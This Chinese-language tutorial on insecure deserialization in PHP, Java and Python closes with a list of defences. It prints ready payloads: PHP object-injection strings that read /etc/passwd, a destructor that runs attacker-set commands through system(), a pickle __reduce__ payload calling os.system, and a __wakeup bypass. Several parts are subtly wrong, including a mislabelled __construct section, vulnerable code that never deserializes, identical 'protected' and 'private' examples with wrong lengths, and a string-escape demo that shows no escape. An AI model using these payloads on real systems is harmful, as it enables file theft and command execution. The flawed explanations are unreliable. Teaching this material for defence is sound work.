# 不安全的反序列化完全指南

## 1. 概述

序列化就是把一个对象变成可以传输的字符串，目的就是为了方便传输。反序列化和序列化是两个正好相反的过程。

序列化的目的是方便数据的传输和存储，json是为了传递数据的方便性。

序列化和反序列化本身并不存在问题。但当反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。

## 2. 漏洞产生原理

### 2.1 序列化与反序列化

#### 2.1.1 json_encode/json_decode

```php
<?php
$book = array(
    'Book1' => 'Harry Potter',
    'Book2' => 'MR.Bean',
    'Book3' => 'Python Cookbook',
    'Book4' => 'History'
);
$json = json_encode($book);
echo $json;
?>

// {"Book1":"Harry Potter","Book2":"MR.Bean","Book3":"Python Cookbook","Book4":"History"}
```

#### 2.1.2 serialize/unserialize

**序列化对象**：

```php
<?php
class Democlass
{
    public $name = "Eagle";
    public $sex = "man";
    public $age = 7;

    function eat(){
        echo $this->name . "吃饭";
    }
}

$example = new DemoClass();
$example->name = "haha";
$example->sex = "woman";
$example->age = 18;

echo serialize($example)
?>

// O:9:"Democlass":3:{s:4:"name";s:4:"haha";s:3:"sex";s:5:"woman";s:3:"age";i:18;}
```

**反序列化对象**：

```php
<?php
class Democlass
{
    public $name = "Eagle";
    public $sex = "man";
    public $age = 7;

    function eat(){
        echo $this->name . "吃饭";
    }
}

$NexExample = unserialize('O:9:"Democlass":3:{s:4:"name";s:4:"haha";s:3:"sex";s:5:"woman";s:3:"age";i:18;}');
echo $NexExample->name;
$NexExample->eat();
?>

// hahahaha吃饭
```

### 2.2 属性类型表示

**public属性**：

```php
// O:9:"Democlass":3:{s:4:"name";s:4:"haha";s:3:"sex";s:5:"woman";s:3:"age";i:18;}
```

**protected属性**：在变量名前加上`%00*%00`

```php
// O:9:"Democlass":3:{s:4:"name";s:4:"haha";s:6:"*sex";s:3:"man";s:14:"Democlassage";i:18;}
```

**private属性**：在变量名前加上`%00类名%00`

```php
// O:9:"Democlass":3:{s:4:"name";s:4:"haha";s:6:"*sex";s:3:"man";s:14:"Democlassage";i:18;}
```

**注意**：序列化不保存方法

### 2.3 魔术方法

魔术方法命名是以`__`开头的，这些函数在某些情况下会自动调用：

```plain
__construct(): 具有构造函数的类会在每次创建新对象时先调用此方法
__destruct(): 析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行
__toString(): 方法用于一个类被当成字符串时应怎样回应
__sleep(): 方法在一个对象被序列化之前调用
__wakeup(): unserialize()会检查是否存在一个__wakeup()方法，如果存在，则会先调用__wakeup方法
__get(), __set(): 当调用或设置一个类及其父类方法中未定义的属性时
__invoke(): 调用函数的方式调用一个对象时的回应方法
__call 和 __callStatic: 前者是调用类不存在的方法时执行，而后者是调用类不存在的静态方式方法时执行
```

**魔术方法执行顺序示例**：

```php
<?php
class Test{
    public function __construct(){
        echo 'construct run<br>';
    }

    public function __destruct(){
        echo 'destruct run<br>';
    }

    public function __toString(){
        echo 'toString run<br>';
        return 'str';
    }

    public function __sleep(){
        echo 'sleep run<br>';
        return array();
    }

    public function __wakeup(){
        echo 'wakeup run<br>';
    }
}

echo 'new了一个对象，对象被创建，执行__construct<br>';
$test = new Test();

echo 'serialize了一个对象，对象被序列化，先执行__sleep，再序列化<br>';
$sTest = serialize($test);

echo '__wakeup(): unserialize()会检查是否存在一个__wakeup()方法，如果存在，则会先调用__wakeup方法<br>';

?>

// new了一个对象，对象被创建，执行__construct
// construct run
// serialize了一个对象，对象被序列化，先执行__sleep，再序列化
// sleep run
// __wakeup(): unserialize()会检查是否存在一个__wakeup()方法，如果存在，则会先调用__wakeup方法
// destruct run
```

## 3. PHP反序列化漏洞

### 3.1 漏洞触发条件

1. 反序列化处的参数用户可控
2. 服务器接收我们序列化后的字符串并且未经过滤
3. 把其中的变量放入一些魔术方法里面执行

### 3.2 常见漏洞利用方式

#### 3.2.1 __construct构造函数

```php
<?php
class FileClass {
    public $filename = '/etc/passwd';
    
    function __destruct() {
        echo file_get_contents($this->filename);
    }
}

$a = $_GET['a'];
unserialize($a);
?>
```

**Payload**：

```plain
?a=O:9:"FileClass":1:{s:8:"filename";s:11:"/etc/passwd";}
```

#### 3.2.2 __toString方法

```php
<?php
class FileClass {
    public $filename = '/etc/passwd';
    
    function __toString() {
        return file_get_contents($this->filename);
    }
}

class Demo {
    public $obj;
    
    function __construct() {
        $this->obj = new FileClass();
    }
    
    function __toString() {
        return $this->obj;
    }
}

$a = $_GET['a'];
echo $a;
?>
```

**Payload**：

```plain
?a=O:4:"Demo":1:{s:3:"obj";O:9:"FileClass":1:{s:8:"filename";s:11:"/etc/passwd";}}
```

#### 3.2.3 __destruct析构函数

```php
<?php
class BackDoor {
    public $cmd = 'whoami';
    
    function __destruct() {
        system($this->cmd);
    }
}

$a = $_GET['a'];
unserialize($a);
?>
```

**Payload**：

```plain
?a=O:8:"BackDoor":1:{s:3:"cmd";s:7:"whoami";}
```

## 4. Java反序列化漏洞

### 4.1 概述

Java反序列化漏洞是指应用程序在反序列化用户输入的数据时，没有进行充分的安全检查，导致攻击者可以构造恶意的序列化数据，从而执行任意代码。

### 4.2 漏洞原理

Java中的序列化是通过`ObjectOutputStream`类实现的，反序列化是通过`ObjectInputStream`类实现的。当应用程序使用`readObject()`方法读取用户输入的数据时，如果数据是恶意的序列化对象，就可能导致漏洞。

### 4.3 常见漏洞组件

- Apache Commons Collections
- Apache Shiro
- Spring Framework
- WebLogic
- JBoss

### 4.4 利用工具

- ysoserial
- JNDIExploit

## 5. Python反序列化漏洞

### 5.1 概述

Python中的序列化是通过`pickle`模块实现的，反序列化是通过`pickle.loads()`函数实现的。

### 5.2 漏洞示例

```python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
print(payload)

# 反序列化执行命令
pickle.loads(payload)
```

### 5.3 Payload

```python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
```

## 6. 绕过技巧

### 6.1 __wakeup绕过

在PHP 5.x版本中，如果序列化字符串中表示对象的个数大于真实个数，就会跳过`__wakeup()`方法：

```plain
// 原始payload
O:4:"Demo":1:{s:3:"obj";O:9:"FileClass":1:{s:8:"filename";s:11:"/etc/passwd";}}

// 绕过__wakeup
O:4:"Demo":2:{s:3:"obj";O:9:"FileClass":1:{s:8:"filename";s:11:"/etc/passwd";}}
```

### 6.2 字符串逃逸

```php
<?php
function filter($str) {
    return str_replace('evil', 'good', $str);
}

$payload = 's:4:"evil"';
echo filter($payload);
// s:4:"good"
```

## 7. 防御措施

1. **避免用户输入直接反序列化**：不要将用户输入直接传递给`unserialize()`函数
2. **使用白名单**：只允许反序列化特定类的对象
3. **禁用危险魔术方法**：在`__wakeup()`和`__destruct()`中添加安全检查
4. **使用安全的序列化格式**：如JSON代替PHP原生序列化
5. **更新依赖组件**：及时修复已知漏洞
